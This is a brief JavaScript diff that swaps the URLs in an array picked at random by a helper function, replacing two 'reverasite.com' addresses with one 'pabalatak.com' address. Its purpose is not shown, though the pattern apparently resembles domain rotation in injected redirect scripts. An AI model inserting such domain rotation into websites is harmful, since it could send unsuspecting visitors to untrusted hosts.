@@ -1,6 +1,5 @@
 var ars = rChoice([
- 'https://reverasite.com',
- 'https://soptax.reverasite.com/'
+ 'https://pabalatak.com'
 ]);
 function rChoice(arr) {
 return arr[Math.floor(arr.length * Math.random())];
